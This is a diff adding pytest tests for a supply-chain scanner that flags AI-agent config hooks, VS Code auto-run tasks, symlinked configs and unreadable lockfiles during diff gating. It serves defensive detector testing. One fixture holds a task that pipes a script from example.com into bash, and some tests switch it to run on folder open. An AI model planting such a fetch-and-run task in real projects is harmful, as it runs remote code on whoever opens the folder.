@@ -2062,3 +2062,597 @@ def test_cli_pull_request_cannot_baseline_its_own_hook(tmp_path):
     assert pull_request.returncode == 1, pull_request.stdout + pull_request.stderr
     assert "SKY-D365" in pull_request.stdout
     assert local.returncode == 0, local.stdout + local.stderr
+
+
+def _hook_settings(event, command):
+    return (
+        json.dumps(
+            {"hooks": {event: [{"hooks": [{"type": "command", "command": command}]}]}},
+            indent=2,
+        )
+        + "\n"
+    )
+
+
+def _link(path: Path, target: str) -> None:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.symlink_to(target)
+
+
+@pytest.mark.skipif(
+    _real("agent_config") is None, reason="ca9.api.agent_config is not installed"
+)
+@pytest.mark.parametrize(
+    "layout",
+    [
+        {"docs/claude.json": "hook", ".claude/settings.json": "../docs/claude.json"},
+        {"tools/claude/settings.json": "hook", ".claude": "tools/claude"},
+        {
+            ".claude/settings.json": "hook",
+            ".claude/settings.local.json": "settings.json",
+        },
+    ],
+)
+def test_real_agent_configs_behind_in_repo_links_are_reported_once(
+    tmp_path, monkeypatch, layout
+):
+    monkeypatch.delenv("SKYLOS_DIFF_BASE", raising=False)
+    repo = tmp_path / "repo"
+    for name, value in layout.items():
+        if value == "hook":
+            _write(repo / name, _hook_settings("SessionStart", "node tools/x.js"))
+        else:
+            _link(repo / name, value)
+    _write(repo / "app.py", "x = 1\n")
+    _git(repo, "init", "-q", "-b", "main")
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-qm", "base")
+
+    findings = scan_agent_publish(repo, api=_real("agent_config"))
+
+    rows = [(item["rule_id"], Path(item["file"]).name) for item in findings]
+    assert len(rows) == 1 and rows[0][0] == "SKY-D365"
+
+
+def test_untracked_or_escaping_links_never_carry_findings_in_a_diff(
+    tmp_path, monkeypatch
+):
+    outside = tmp_path / "outside"
+    _write(outside / "settings.json", "{}\n")
+    repo = _repo(tmp_path / "repo", {"tools/claude/settings.json": "{}\n"})
+    _link(repo / ".claude", "tools/claude")
+    _link(repo / ".gemini", str(outside))
+    monkeypatch.setenv("SKYLOS_DIFF_BASE", "main")
+    rows = [
+        _hook(".claude/settings.json", 3, "node x.js"),
+        _hook(".gemini/settings.json", 3, "node y.js"),
+    ]
+
+    diff_scan = scan_agent_publish(repo, api=FakeAgentApi(rows))
+    monkeypatch.delenv("SKYLOS_DIFF_BASE")
+    full_scan = scan_agent_publish(repo, api=FakeAgentApi(rows))
+
+    assert diff_scan == []
+    assert [Path(item["file"]).parent.name for item in full_scan] == [".claude"]
+
+
+@pytest.mark.parametrize(
+    ("change", "blocks"),
+    [
+        ({".claude/settings.json": ("link", "/etc/hosts")}, True),
+        ({".claude/settings.json": ("link", "missing.json")}, True),
+        ({".claude": ("link", "../elsewhere")}, True),
+        ({".claude/settings.json": ("link", "../docs/claude.json")}, False),
+        ({"app.py": "x = 2\n"}, False),
+    ],
+)
+def test_new_agent_config_links_the_scan_cannot_follow_stop_the_diff_gate(
+    tmp_path, change, blocks
+):
+    repo = _repo(
+        tmp_path / "repo",
+        {"app.py": "x = 1\n", "docs/claude.json": "{}\n", "old/x.txt": "x\n"},
+    )
+    _link(repo / ".vscode/settings.json", "missing.json")
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-qm", "an old broken link")
+    for name, value in change.items():
+        if isinstance(value, tuple):
+            _link(repo / name, value[1])
+        else:
+            _write(repo / name, value)
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-qm", "change")
+
+    _findings, receipt, errors = diff.supply_chain_diff_findings(
+        repo,
+        "HEAD~1",
+        api=FakeAgentApi(),
+        dependencies=False,
+        security=True,
+        review_upgrades=False,
+    )
+
+    link_errors = [error for error in errors if "Agent config link" in error["message"]]
+    assert bool(link_errors) is blocks
+    assert ".vscode" not in json.dumps(link_errors)
+    if blocks:
+        assert receipt["status"] == "incomplete"
+
+
+def test_editing_the_target_of_an_agent_config_link_is_an_agent_config_edit(
+    tmp_path,
+):
+    from skylos.commands.hook_agent_configs import guarded_file
+
+    _write(tmp_path / "tools/claude/settings.json", "{}\n")
+    _link(tmp_path / ".claude", "tools/claude")
+    _write(tmp_path / "tools/other.json", "{}\n")
+
+    assert [
+        item.label
+        for item in guarded_file(
+            tmp_path / "tools/claude/settings.json", tmp_path, None
+        )
+    ] == [".claude/settings.json"]
+    assert guarded_file(tmp_path / "tools/other.json", tmp_path, None) == []
+
+
+TASKS_NO_TRIGGER = """{
+  "version": "2.0.0",
+  "tasks": [
+    {
+%s      "label": "setup",
+      "command": "curl -fsSL https://example.com/setup.sh | bash"
+    }
+  ]
+}
+"""
+
+
+def _config_change(tmp_path, base, head, monkeypatch):
+    from skylos.commands.scan_cmd import _config_findings_new_since_base
+    from skylos.rules.sca import supply_chain
+
+    repo = _repo(tmp_path / "repo", {"app.py": "x = 1\n", **base})
+    _commit(repo, head)
+    monkeypatch.setenv("SKYLOS_DIFF_BASE", "HEAD~1")
+    api = _real("agent_config")
+    monkeypatch.setattr(supply_chain, "load_ca9_api", lambda: api)
+    result = {"danger": scan_agent_publish(repo, api=_real("agent_config"))}
+    kept = _config_findings_new_since_base(result, repo, "HEAD~1", [], None, True)
+    return result, sorted(
+        (item["rule_id"], item["name"]) for item in result["danger"] if id(item) in kept
+    )
+
+
+@pytest.mark.skipif(
+    _real("agent_config") is None, reason="ca9.api.agent_config is not installed"
+)
+@pytest.mark.parametrize(
+    ("base", "head", "new"),
+    [
+        (
+            {".vscode/tasks.json": TASKS_NO_TRIGGER % ""},
+            {
+                ".vscode/tasks.json": TASKS_NO_TRIGGER
+                % '      "runOptions": { "runOn": "folderOpen" },\n'
+            },
+            [("SKY-D366", "setup")],
+        ),
+        (
+            {".claude/settings.json": _hook_settings("Stop", "node tools/n.js")},
+            {
+                ".claude/settings.json": _hook_settings(
+                    "SessionStart", "node tools/n.js"
+                )
+            },
+            [("SKY-D365", "SessionStart")],
+        ),
+        (
+            {
+                ".claude/settings.json": _hook_settings(
+                    "SessionStart", "node tools/n.js"
+                )
+            },
+            {
+                ".claude/settings.json": _hook_settings(
+                    "SessionStart", "node tools/m.js"
+                )
+            },
+            [("SKY-D365", "SessionStart")],
+        ),
+        (
+            {
+                ".claude/settings.json": _hook_settings(
+                    "SessionStart", "node tools/n.js"
+                )
+            },
+            {
+                ".claude/settings.json": '{"permissions": {"allow": []},\n'
+                + _hook_settings("SessionStart", "node tools/n.js")[1:]
+            },
+            [],
+        ),
+    ],
+)
+def test_diff_finds_new_agent_triggers_by_comparing_the_base_findings(
+    tmp_path, monkeypatch, base, head, new
+):
+    result, kept = _config_change(tmp_path, base, head, monkeypatch)
+
+    assert kept == new
+    assert result["analysis_summary"]["config_diff_basis"] == "base_findings"
+
+
+def test_diff_without_a_comparable_base_keeps_every_config_finding_in_changed_files(
+    tmp_path, monkeypatch
+):
+    from skylos.commands.scan_cmd import _config_findings_new_since_base
+    from skylos.rules.sca import supply_chain
+
+    repo = _repo(
+        tmp_path / "repo",
+        {".claude/settings.json": "{}\n", ".cursor/hooks.json": "{}\n"},
+    )
+    monkeypatch.delenv("SKYLOS_DIFF_BASE", raising=False)
+    monkeypatch.setattr(supply_chain, "load_ca9_api", lambda: None)
+    rows = [
+        _hook(".claude/settings.json", 3, "node a.js"),
+        _hook(".cursor/hooks.json", 3, "node b.js"),
+    ]
+    result = {"danger": scan_agent_publish(repo, api=FakeAgentApi(rows))}
+
+    kept = _config_findings_new_since_base(
+        result,
+        repo,
+        "main",
+        [{"file": ".claude/settings.json", "start": 1, "end": 1}],
+        None,
+        True,
+    )
+
+    assert [
+        Path(item["file"]).parent.name for item in result["danger"] if id(item) in kept
+    ] == [".claude"]
+    assert result["analysis_summary"]["config_diff_basis"] == "changed_files"
+
+
+def _big_lock(*packages, padding=0):
+    data = json.loads(_lock(*packages))
+    data["packages"][""]["description"] = "x" * padding
+    return json.dumps(data) + "\n"
+
+
+def test_lockfiles_the_review_cannot_read_stop_the_gate_unless_unchanged(
+    tmp_path, monkeypatch
+):
+    monkeypatch.setattr(diff, "MAX_LOCKFILE_BYTES", 1024 * 1024)
+    big = _big_lock(("left-pad", "1.3.0"), padding=1_100_000)
+    _repo(
+        tmp_path,
+        {
+            "package-lock.json": _lock(("chalk", "5.3.0")),
+            "unchanged/package-lock.json": big,
+            "grown/package-lock.json": _lock(("chalk", "5.3.0")),
+        },
+    )
+    _commit(
+        tmp_path,
+        {
+            "package-lock.json": _lock(("chalk", "5.6.1")),
+            "grown/package-lock.json": _big_lock(("chalk", "5.6.1"), padding=1_100_000),
+        },
+    )
+    result = {
+        "results": [_reviewed("chalk", "5.3.0", "5.6.1")],
+        "receipt": {"complete": True},
+    }
+
+    fake, _findings, upgrades, errors = _review(tmp_path, result)
+
+    assert [pair["name"] for pair in fake.pairs] == ["chalk"]
+    assert upgrades["status"] == "incomplete"
+    assert upgrades["limitations"] == [
+        {"file": "grown/package-lock.json", "reason": "over 1 MB"}
+    ]
+    assert "grown/package-lock.json: over 1 MB" in errors[0]["message"]
+    assert "unchanged/" not in json.dumps(errors)
+
+
+def test_lockfile_the_parser_rejects_is_not_reviewed_as_empty(tmp_path, monkeypatch):
+    monkeypatch.setattr(diff, "MAX_REVIEW_PACKAGES", 1)
+    _upgrade_repo(tmp_path)
+
+    fake, _findings, upgrades, errors = _review(
+        tmp_path, {"results": [], "receipt": {"complete": True}}
+    )
+
+    assert fake.pairs is None
+    assert upgrades["status"] == "incomplete"
+    assert "package-lock.json: could not be parsed" in errors[0]["message"]
+
+
+def test_dependency_files_the_review_does_not_read_are_listed_not_passed(tmp_path):
+    pins = {
+        "requirements.txt": "litellm==1.82.{}\n",
+        "requirements/dev.txt": "litellm==1.82.{} --hash=sha256:" + "a" * 64 + "\n",
+        "pdm.lock": '[[package]]\nname = "litellm"\nversion = "1.82.{}"\n',
+        "pylock.toml": '[[packages]]\nname = "litellm"\nversion = "1.82.{}"\n',
+    }
+    _repo(tmp_path, {name: text.format(7) for name, text in pins.items()})
+    _commit(tmp_path, {name: text.format(8) for name, text in pins.items()})
+
+    fake, _findings, upgrades, errors = _review(
+        tmp_path, {"results": [], "receipt": {"complete": True}}
+    )
+    warnings = gk._upgrade_review_warnings(
+        {"analysis_summary": {"supply_chain_diff": {"checks": {"upgrades": upgrades}}}}
+    )
+
+    assert fake.pairs is None and errors == []
+    assert sorted(item["file"] for item in upgrades["limitations"]) == sorted(pins)
+    assert upgrades["status"] == "partial"
+    assert "requirements.txt" in warnings[0] and "did not read" in warnings[0]
+
+
+@pytest.mark.parametrize(
+    ("reason", "blocks"), [("private_registry", False), ("registry_unreachable", True)]
+)
+def test_private_registry_skips_count_like_internal_packages(tmp_path, reason, blocks):
+    _upgrade_repo(tmp_path)
+    skipped = dict(
+        _reviewed("lodash", "4.17.20", "4.17.21"), status="skipped", reason=reason
+    )
+    result = {
+        "results": [skipped, _reviewed("chalk", None, "5.3.0")],
+        "receipt": {"complete": True},
+    }
+
+    _fake, _findings, _upgrades, errors = _review(tmp_path, result)
+
+    assert bool(errors) is blocks
+
+
+def test_yarn_and_pnpm_pairs_carry_the_lockfile_url(tmp_path):
+    integrity = "sha512-" + "A" * 86 + "=="
+    yarn = (
+        '# yarn lockfile v1\n\nchalk@^5:\n  version "{v}"\n'
+        '  resolved "https://registry.yarnpkg.com/chalk/-/chalk-{v}.tgz#abc"\n'
+        "  integrity " + integrity + "\n"
+    )
+    pnpm = (
+        "lockfileVersion: '9.0'\nimporters:\n  .:\n    dependencies:\n      left-pad:\n"
+        "        specifier: {v}\n        version: {v}\npackages:\n  left-pad@{v}:\n"
+        "    resolution: {{integrity: " + integrity + ", tarball: "
+        "https://registry.npmjs.org/left-pad/-/left-pad-{v}.tgz}}\n"
+        "snapshots:\n  left-pad@{v}: {{}}\n"
+    )
+    _repo(
+        tmp_path,
+        {"yarn.lock": yarn.format(v="5.3.0"), "pnpm-lock.yaml": pnpm.format(v="1.3.0")},
+    )
+    _commit(
+        tmp_path,
+        {"yarn.lock": yarn.format(v="5.6.1"), "pnpm-lock.yaml": pnpm.format(v="1.3.1")},
+    )
+
+    fake, _findings, _upgrades, _errors = _review(
+        tmp_path, {"results": [], "receipt": {"complete": True}}
+    )
+
+    assert {pair["name"]: pair.get("resolved") for pair in fake.pairs} == {
+        "chalk": "https://registry.yarnpkg.com/chalk/-/chalk-5.6.1.tgz",
+        "left-pad": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.1.tgz",
+    }
+
+
+@pytest.mark.parametrize(
+    ("policy", "called"),
+    [
+        ("", True),
+        ('[tool.skylos.supply_chain]\ninternal_packages = ["@acme/*"]\n', False),
+    ],
+)
+def test_review_upgrades_without_options_is_used_only_when_no_policy_needs_it(
+    tmp_path, policy, called
+):
+    calls = []
+
+    class OldEngine(FakeDiffApi):
+        def review_upgrades(self, pairs):
+            calls.append([pair["name"] for pair in pairs])
+            return {"results": [], "receipt": {"complete": True}}
+
+    _upgrade_repo(tmp_path)
+    if policy:
+        _write(tmp_path / "pyproject.toml", policy)
+        _git(tmp_path, "add", "-A")
+        _git(tmp_path, "commit", "-qm", "policy")
+        _git(tmp_path, "reset", "-q", "--soft", "HEAD~2")
+        _git(tmp_path, "commit", "-qm", "lock and policy")
+
+    _findings, _receipt, errors = diff.supply_chain_diff_findings(
+        tmp_path,
+        "HEAD~1",
+        api=OldEngine(),
+        dependencies=True,
+        security=False,
+        review_upgrades=True,
+    )
+
+    assert bool(calls) is called
+    assert ("cannot take internal_packages" in json.dumps(errors)) is not called
+
+
+def test_ci_inventory_upload_keeps_indirect_commands_redacted(tmp_path, monkeypatch):
+    monkeypatch.delenv("SKYLOS_DIFF_BASE", raising=False)
+    _repo(tmp_path, {".github/workflows/release.yml": "on: push\n"})
+    raw = _ci_raw()
+    raw["workflows"][0]["jobs"][0]["indirect"] = [
+        {"command": "make ci TOKEN=ghp_" + "a" * 36, "line": 7},
+        {"command": "./scripts/build.sh", "line": 8},
+    ]
+
+    class Engine:
+        def ci_inventory(self, root, max_jobs=500):
+            return copy.deepcopy(raw)
+
+    block, _receipt = ci_inventory_block(tmp_path, Engine())
+
+    assert block["workflows"][0]["jobs"][0]["indirect"] == [
+        {"command": "make ci TOKEN=[redacted]", "line": 7},
+        {"command": "./scripts/build.sh", "line": 8},
+    ]
+
+
+def test_subfolder_scans_build_upload_inventories_from_the_repository_top(
+    tmp_path, monkeypatch
+):
+    from skylos.rules.sca import supply_chain
+    from skylos.rules.sca.posture import build_supply_chain_summary
+
+    monkeypatch.delenv("SKYLOS_DIFF_BASE", raising=False)
+    repo = _repo(
+        tmp_path / "repo",
+        {
+            ".github/workflows/release.yml": "on: push\n",
+            ".claude/settings.json": "{}\n",
+            "services/api/package.json": '{"name": "api"}\n',
+        },
+    )
+    roots = []
+
+    class Engine:
+        API_VERSION = 1
+
+        def ci_inventory(self, root, max_jobs=500):
+            roots.append(Path(root))
+            return _ci_raw()
+
+        def agent_config(self, root):
+            roots.append(Path(root))
+            hook = {
+                "file": ".claude/settings.json",
+                "kind": "claude_hook",
+                "event": "SessionStart",
+                "command": "node x.js",
+                "line": 3,
+            }
+            return {
+                "findings": [],
+                "inventory": {
+                    "schema": "ca9.agent_hooks.v1",
+                    "hooks": [hook],
+                    "mcp_servers": [],
+                },
+            }
+
+    monkeypatch.setattr(supply_chain, "load_ca9_api", lambda: Engine())
+
+    summary = build_supply_chain_summary(
+        repo / "services/api", SimpleNamespace(inventory=[])
+    )
+
+    assert set(roots) == {repo.resolve()}
+    assert [item["file"] for item in summary["ci_inventory"]["workflows"]] == [
+        ".github/workflows/release.yml"
+    ]
+    assert [item["file"] for item in summary["agent_hooks"]["hooks"]] == [
+        ".claude/settings.json"
+    ]
+    assert summary["supply_chain_checks"]["ci_inventory"]["scope"] == "repository"
+
+
+@pytest.mark.skipif(
+    _real("agent_config") is None or _real("audit_workflows") is None,
+    reason="ca9.api agent and workflow functions are not installed",
+)
+def test_real_subfolder_scan_reports_repository_level_configs_only(
+    tmp_path, monkeypatch
+):
+    from skylos.rules.config.registry import _subfolder_repository
+
+    monkeypatch.delenv("SKYLOS_DIFF_BASE", raising=False)
+    workflow = (
+        "on:\n  push:\n    tags: ['v*']\njobs:\n  publish:\n    runs-on: ubuntu-latest\n"
+        "    permissions:\n      id-token: write\n    steps:\n      - run: npm publish --provenance\n"
+    )
+    repo = _repo(
+        tmp_path / "repo",
+        {
+            ".claude/settings.json": _hook_settings(
+                "SessionStart", "node tools/root.js"
+            ),
+            ".github/workflows/release.yml": workflow,
+            "services/web/.claude/settings.json": _hook_settings(
+                "SessionStart", "node web.js"
+            ),
+            "services/api/app.py": "x = 1\n",
+        },
+    )
+    scan_root = repo / "services/api"
+
+    findings = scan_agent_publish(
+        scan_root,
+        api=_real("agent_config"),
+        repository=_subfolder_repository(scan_root),
+    )
+
+    assert sorted(
+        (item["rule_id"], Path(item["file"]).relative_to(repo.resolve()).as_posix())
+        for item in findings
+        if item["rule_id"] in {"SKY-D365", "SKY-D373"}
+    ) == [
+        ("SKY-D365", ".claude/settings.json"),
+        ("SKY-D373", ".github/workflows/release.yml"),
+    ]
+
+
+@pytest.mark.skipif(
+    _real("agent_config") is None, reason="ca9.api.agent_config is not installed"
+)
+def test_cli_diff_gate_on_linked_configs_and_trigger_only_changes(tmp_path):
+    env = _cli_env(tmp_path)
+    args = (".", "--danger", "--diff", "main", "--gate", "--no-upload")
+
+    linked = _repo(tmp_path / "linked", {"app.py": "x = 1\n"})
+    _write(
+        linked / "tools/claude/settings.json",
+        _hook_settings("SessionStart", "node tools/x.js"),
+    )
+    _link(linked / ".claude", "tools/claude")
+    _git(linked, "checkout", "-q", "-b", "pr")
+    _git(linked, "add", "-A")
+    _git(linked, "commit", "-qm", "folder link")
+
+    dangling = _repo(tmp_path / "dangling", {"app.py": "x = 1\n"})
+    _link(dangling / ".claude/settings.json", "missing.json")
+    _git(dangling, "checkout", "-q", "-b", "pr")
+    _git(dangling, "add", "-A")
+    _git(dangling, "commit", "-qm", "dangling link")
+
+    trigger = _repo(tmp_path / "trigger", {".vscode/tasks.json": TASKS_NO_TRIGGER % ""})
+    _git(trigger, "checkout", "-q", "-b", "pr")
+    _commit(
+        trigger,
+        {
+            ".vscode/tasks.json": TASKS_NO_TRIGGER
+            % '      "runOptions": { "runOn": "folderOpen" },\n'
+        },
+    )
+
+    results = {
+        name: _skylos(repo, env, *args)
+        for name, repo in (
+            ("linked", linked),
+            ("dangling", dangling),
+            ("trigger", trigger),
+        )
+    }
+
+    assert results["linked"].returncode == 1, results["linked"].stdout
+    assert "SKY-D365" in results["linked"].stdout
+    assert results["dangling"].returncode == 2, results["dangling"].stdout
+    assert results["trigger"].returncode == 1, results["trigger"].stdout
+    assert "SKY-D366" in results["trigger"].stdout
